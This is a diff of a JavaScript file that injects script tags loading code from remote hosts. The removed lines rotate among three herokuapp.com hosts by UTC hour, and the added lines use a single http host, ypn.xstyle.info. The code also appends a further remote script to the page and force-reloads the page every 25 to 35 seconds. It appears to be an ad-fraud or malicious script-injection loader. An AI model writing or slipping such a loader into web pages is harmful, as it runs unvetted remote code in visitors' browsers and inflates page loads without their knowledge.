@@ -159,65 +159,23 @@ function mBV(s,b,t,a){
 	 var bEn='<\/p>';
  }
 
- var nD=new Date();
- var nH=nD.getUTCHours();
+if(s=='s'&&t!=0){
+ 	var aId='072dd228c519a31a4894e0005b4f3ad6';
+}
+if(s=='b'&&t!=0){
+ 	var aId='4ee7ba830860b984f54c5068ef2ff111';
+}
+if(s=='m'&&t!=0){
+ 	var aId='a15faa52c7e806cd608a2959fe0fe760';
+}
 
- if(nH<8){
-	if(s=='s'&&t!=0){
-	 	var aId='072dd228c519a31a4894e0005b4f3ad6';
-	}
-	if(s=='b'&&t!=0){
-	 	var aId='4ee7ba830860b984f54c5068ef2ff111';
-	}
-	if(s=='m'&&t!=0){
-	 	var aId='a15faa52c7e806cd608a2959fe0fe760';
-	}
-
-	return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a='+aId+'\"><\/script>'+bEn;
- }
- if(nH>=8 && nH<16){
-	if(s=='s'&&t!=0){
-	 	var aId='072dd228c519a31a4894e0005b4f3ad6';
-	}
-	if(s=='b'&&t!=0){
-	 	var aId='4ee7ba830860b984f54c5068ef2ff111';
-	}
-	if(s=='m'&&t!=0){
-	 	var aId='a15faa52c7e806cd608a2959fe0fe760';
-	}
-
-	return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a='+aId+'\"><\/script>'+bEn;
- }
- if(nH>=16){
-	if(s=='s'&&t!=0){
-	 	var aId='072dd228c519a31a4894e0005b4f3ad6';
-	}
-	if(s=='b'&&t!=0){
-	 	var aId='4ee7ba830860b984f54c5068ef2ff111';
-	}
-	if(s=='m'&&t!=0){
-	 	var aId='a15faa52c7e806cd608a2959fe0fe760';
-	}
-
-	return bSt+'<script id="yp_1391" src=\"https://radiant-everglades-72351.herokuapp.com/get2.php?a='+aId+'\"><\/script>'+bEn;
- }
+return bSt+'<script id="yp_1391" src=\"http://ypn.xstyle.info/get2.php?a='+aId+'\"><\/script>'+bEn;
 
 }
 
 
 $(document).ready(function(){
-	var nD=new Date();
-	var nH=nD.getUTCHours();
-
-	if(nH<8){
-		$('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=7881"><\/script>');
-	}
-	if(nH>=8 && nH<16){
-		$('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=7881"><\/script>');
-	}
-	if(nH>=16){
-		$('body').append('<script src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=7881"><\/script>');
-	}
+	$('body').append('<script src="http:\/\/ypn.xstyle.info\/?id=7881"><\/script>');
 
 	var ta=Math.floor(Math.random()*10001)+25000;
 	setTimeout(function(){ window.location=window.location; },ta);
